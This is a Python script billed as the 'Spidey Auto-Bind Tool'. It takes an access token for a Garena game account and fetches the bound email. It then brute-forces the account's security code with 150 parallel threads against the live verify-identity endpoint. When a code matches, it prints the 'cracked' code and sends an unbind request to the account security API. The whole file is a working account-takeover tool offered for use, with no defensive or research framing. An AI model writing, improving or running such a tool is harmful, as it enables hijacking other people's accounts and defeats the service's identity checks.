import requests
import os
import sys
import json
import time
import hashlib
import threading
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Color definitions
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    MAGENTA = '\033[95m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# Global flag to stop all workers once a code is found
stop_workers = threading.Event()
found_code = None
found_identity_token = None
found_lock = threading.Lock()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def draw_header(subtitle=""):
    clear_screen()
    spidey_logo = f"""{Colors.CYAN}
    ███████╗██████╗ ██╗██████╗ ███████╗██╗   ██╗
    ██╔════╝██╔══██╗██║██╔══██╗██╔════╝╚██╗ ██╔╝
    ███████╗██████╔╝██║██║  ██║█████╗   ╚████╔╝ 
    ╚════██║██╔═══╝ ██║██║  ██║██╔══╝    ╚██╔╝  
    ███████║██║     ██║██████╔╝███████╗   ██║   
    ╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝   ╚═╝   {Colors.END}"""
    print(spidey_logo)
    print(f"{Colors.MAGENTA}●{'═' * 15} {Colors.WHITE}{Colors.BOLD}Spidey Auto-Bind Tool {Colors.END}{Colors.MAGENTA}{'═' * 15}●{Colors.END}\n")
    print(f" {Colors.GREEN}⊛ STATUS    : {Colors.WHITE}AUTOMATED MODE (MULTI-THREADED){Colors.END}")
    print(f"\n{Colors.MAGENTA}●{'═' * 48}●{Colors.END}\n")
    if subtitle:
        print(f" {Colors.CYAN}CURRENT OPTION : {Colors.WHITE}{subtitle}{Colors.END}")
        print(f"\n{Colors.MAGENTA}●{'═' * 48}●{Colors.END}\n")

def input_prompt(msg):
    return input(f"{Colors.CYAN}» {Colors.WHITE}{msg} : {Colors.END}").strip()

def get_bound_email(access_token):
    """Fetch the bound email for the given access token."""
    try:
        url = "https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        params = {'app_id': '100067', 'access_token': access_token}
        headers = {'User-Agent': 'GarenaMSDK/4.0.30'}
        resp = requests.get(url, params=params, headers=headers, timeout=10)
        if resp.status_code != 200:
            print(f" {Colors.RED}⊛ API error: HTTP {resp.status_code}{Colors.END}")
            return None
        data = resp.json()
        email = data.get('email')
        if not email:
            print(f" {Colors.RED}⊛ No email bound to this account.{Colors.END}")
            return None
        return email
    except Exception as e:
        print(f" {Colors.RED}⊛ Failed to fetch bind info: {str(e)}{Colors.END}")
        return None

def verify_code(email, access_token, hashed_code):
    """Attempt to verify a single security code. Returns identity_token if successful, else None."""
    if stop_workers.is_set():
        return None
    url = "https://100067.connect.garena.com/game/account_security/bind:verify_identity"
    headers = {
        'User-Agent': 'GarenaMSDK/4.0.30',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
    }
    data = {
        'email': email,
        'app_id': '100067',
        'access_token': access_token,
        'secondary_password': hashed_code
    }
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=8)
        if resp.status_code != 200:
            return None
        json_data = resp.json()
        token = json_data.get('identity_token')
        if token:
            return token
    except Exception:
        pass
    return None

def worker_task(email, access_token, code_queue, total_codes, processed_counter):
    """Worker thread: takes codes from the queue and tries them until success or queue empty."""
    while not stop_workers.is_set():
        try:
            code = code_queue.get(timeout=0.5)
        except:
            break
        if stop_workers.is_set():
            break

        # Hash the code (SHA-256) only once per worker
        hashed = hashlib.sha256(code.encode('utf-8')).hexdigest()
        
        # Update progress (thread-safe)
        with processed_counter_lock:
            processed_counter[0] += 1
            count = processed_counter[0]
            if count % 50 == 0 or count == total_codes:
                print(f" {Colors.YELLOW}Progress: {count}/{total_codes} codes tested...{Colors.END}", end='\r')
        
        token = verify_code(email, access_token, hashed)
        if token:
            with found_lock:
                if not stop_workers.is_set():
                    stop_workers.set()
                    global found_code, found_identity_token
                    found_code = code
                    found_identity_token = token
            break
        # small sleep to avoid overwhelming the server (optional)
        # time.sleep(0.05)

def automated_unbind_bypass():
    draw_header("AUTOMATIC UNBIND - SECURITY CODE BYPASS (MULTI-THREADED)")
    
    # Check HLO.txt
    if not os.path.exists("HLO.txt"):
        print(f" {Colors.RED}⊛ Error: 'HLO.txt' not found! Please create it with security codes (one per line).{Colors.END}")
        return

    access_token = input_prompt("Enter Access Token")
    if not access_token:
        print(f" {Colors.RED}⊛ Access token cannot be empty.{Colors.END}")
        return

    # 1. Get bound email
    print(f"\n {Colors.MAGENTA}⊛ [1/3]{Colors.END} {Colors.WHITE}Fetching bound email...{Colors.END}")
    email = get_bound_email(access_token)
    if not email:
        print(f" {Colors.RED}⊛ Could not retrieve bound email. Check token validity.{Colors.END}")
        return
    print(f" {Colors.GREEN}⊛ Bound Email: {email}{Colors.END}")

    # 2. Load codes from HLO.txt
    print(f"\n {Colors.MAGENTA}⊛ [2/3]{Colors.END} {Colors.WHITE}Loading codes from HLO.txt...{Colors.END}")
    with open("HLO.txt", "r") as f:
        codes = [line.strip() for line in f if line.strip()]
    if not codes:
        print(f" {Colors.RED}⊛ HLO.txt is empty.{Colors.END}")
        return
    print(f" {Colors.GREEN}⊛ Total codes loaded: {len(codes)}{Colors.END}")

    # 3. Multi-threaded brute-force
    print(f"\n {Colors.MAGENTA}⊛ [3/3]{Colors.END} {Colors.WHITE}Starting brute-force with 150 workers...{Colors.END}")
    global stop_workers, found_code, found_identity_token, processed_counter_lock
    stop_workers.clear()
    found_code = None
    found_identity_token = None
    processed_counter_lock = threading.Lock()
    processed_counter = [0]  # mutable counter

    # Create a queue and fill with codes
    code_queue = Queue()
    for c in codes:
        code_queue.put(c)

    total_codes = len(codes)
    # Start thread pool with 150 workers
    max_workers = 150
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for _ in range(max_workers):
            futures.append(executor.submit(worker_task, email, access_token, code_queue, total_codes, processed_counter))
        
        # Wait for all threads to complete or stop flag
        for future in as_completed(futures):
            if stop_workers.is_set():
                # Cancel remaining futures (they will check flag)
                for f in futures:
                    f.cancel()
                break

    print(" " * 80, end='\r')  # clear progress line

    if found_identity_token and found_code:
        print(f"\n {Colors.GREEN}█████████████████████████████████████████{Colors.END}")
        print(f" {Colors.GREEN}⊛ VERIFICATION SUCCESSFUL!{Colors.END}")
        print(f" {Colors.GREEN}⊛ CRACKED SECURITY CODE: {Colors.BOLD}{Colors.WHITE}{found_code}{Colors.END}")
        print(f" {Colors.GREEN}█████████████████████████████████████████{Colors.END}")

        # 4. Send unbind request
        print(f"\n {Colors.MAGENTA}⊛ [FINAL]{Colors.END} {Colors.WHITE}Sending unbind request...{Colors.END}")
        unbind_url = "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request"
        headers = {
            'User-Agent': 'GarenaMSDK/4.0.30',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        data = {
            'app_id': '100067',
            'access_token': access_token,
            'identity_token': found_identity_token
        }
        try:
            resp = requests.post(unbind_url, headers=headers, data=data, timeout=10)
            print(f" {Colors.CYAN}⊛ Server Response: {resp.text}{Colors.END}")
        except Exception as e:
            print(f" {Colors.RED}⊛ Unbind request failed: {str(e)}{Colors.END}")
    else:
        print(f"\n {Colors.RED}⊛ Identity verification FAILED! No code matched.{Colors.END}")

    print(f"\n{Colors.MAGENTA}●{'═' * 20} SCRIPT EXITED {'═' * 20}●{Colors.END}\n")

if __name__ == "__main__":
    try:
        automated_unbind_bypass()
    except KeyboardInterrupt:
        print(f"\n\n {Colors.RED}⊛ Process interrupted by user. Exiting...👋{Colors.END}\n")
